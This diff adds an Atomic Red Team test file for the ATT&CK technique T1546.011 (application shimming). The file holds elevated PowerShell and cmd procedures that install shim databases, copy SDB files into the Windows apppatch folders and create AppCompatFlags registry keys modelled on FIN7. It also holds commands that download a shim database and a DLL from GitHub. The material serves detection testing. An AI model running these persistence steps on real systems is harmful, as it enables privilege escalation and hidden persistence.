@@ -1,0 +1,71 @@
+{
+  "attack_technique": "T1546.011",
+  "display_name": "Event Triggered Execution: Application Shimming",
+  "atomic_tests": [
+    {
+      "name": "Application Shim Installation",
+      "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "sdbinst.exe -u \"#{file_path}\" >nul 2>&1",
+        "procedure": "sdbinst.exe \"#{file_path}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "file_path",
+          "description": "Path to the shim database file",
+          "type": "string",
+          "default": "PathToAtomicsFolder\\T1546.011\\bin\\AtomicShimx86.sdb"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Shim database file must exist on disk at specified location (#{file_path})",
+          "prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb\" -OutFile \"#{file_path}\""
+        },
+        {
+          "description": "AtomicTest.dll must exist at c:\\Tools\\AtomicTest.dll",
+          "prereq_command": "if (Test-Path c:\\Tools\\AtomicTest.dll) {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path c:\\Tools\\AtomicTest.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll\" -OutFile c:\\Tools\\AtomicTest.dll"
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "9ab27e22-ee62-4211-962b-d36d9a0e6a18"
+    },
+    {
+      "name": "New shim database files created in the default shim database directory",
+      "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\nRemove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb -ErrorAction Ignore",
+        "procedure": "Copy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "aefd6866-d753-431f-a7a4-215ca7e3f13d"
+    },
+    {
+      "name": "Registry key creation and/or modification events for SDB",
+      "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore\nRemove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore",
+        "procedure": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\""
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "9b6a06f9-ab5e-4e8d-8289-1df4289db02f"
+    }
+  ]
+}
